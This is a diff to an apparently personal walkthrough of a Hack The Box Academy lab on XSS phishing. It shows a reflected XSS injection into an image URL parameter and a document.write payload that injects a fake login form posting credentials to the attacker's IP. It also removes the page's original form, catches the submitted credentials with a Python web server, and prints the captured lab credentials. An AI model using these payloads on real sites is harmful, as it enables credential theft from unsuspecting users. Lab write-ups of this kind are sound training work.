@@ -42,18 +42,70 @@
 
 >[Phishing ](https://academy.hackthebox.com/module/103/section/984)  
 
->Try to find a working XSS payload for the Image URL form found at '/phishing' in the `http://10.129.72.106/phishing/index.php` server.
+>Try to find a working XSS payload for the Image URL form found at '/phishing' in the `http://10.129.63.83/phishing/index.php` server.
 >Then use what you learned in this section to prepare a malicious URL that injects a malicious login form.
 >Then visit '/phishing/send.php' to send the URL to the victim
 >The victim user will log into the malicious login form. 
 >If you did everything correctly, you should receive the victim's login credentials.
 >Use obtained victim login gain access to '/phishing/login.php' and obtain the flag.  
 
->XSS Identified:
+>XSS injection point identified in source code below:  
+
+![xss-source-code-review](/images/xss-source-code-review.png)  
+
+>Below below uses `'>` to break out of te source code img tag.  
 
 ```
-http://10.129.72.106/phishing/index.php?url=http://10.10.15.41/image.png'><script>alert('xss found')</script>
+http://10.129.63.83/phishing/index.php?url=http://10.10.15.41/image.png'><script>alert('xss found')</script>
 ```  
 
 ![xss-phishing-found](/images/xss-phishing-found.png)  
+
+>Login Form Injection phishing attack
+
+```html
+<div>
+<h3>Please login to continue</h3>
+<input type="text" placeholder="Username">
+<input type="text" placeholder="Password">
+<input type="submit" value="Login">
+<br><br>
+</div>
+```  
+
+>Use above and make Single JavaScript Cookie Stealer one-liner:
+
+```
+document.write('<h3>Please login to continue</h3><form action=http://10.10.15.41><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
+```  
+
+![xss-cleanup](/images/xss-cleanup.png)  
+
+>Removing the target function input box to get victim to login and provide credentials instead.
+>From source code the HTML element we need to remove is the `urlform` id.  
+
+```JavaScript
+document.getElementById('urlform').remove();
+```  
+
+>Combine above remove functions with single oneline payload:  
+
+```JavaScript
+<script>
+document.write('<h3>Please login to continue</h3><form action=http://10.10.15.41><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
+</script>
+<!--
+```  
+
+![XSS-Phishing-payload-remove-html-id](/images/XSS-Phishing-payload-remove-html-id.PNG)  
+
+>Using Exploit send phishing link url to victim: `http://10.129.63.83/phishing/send.php`.  
+
+>Once the link send the kali hosted `python3 -m http.server 80` service receive the credentials from victim that clicked on the link and typed their info.
+
+![xss-phishing-server](/images/xss-phishing-server.png)  
+
+```
+username=admin&password=p1zd0nt57341myp455
+```
 
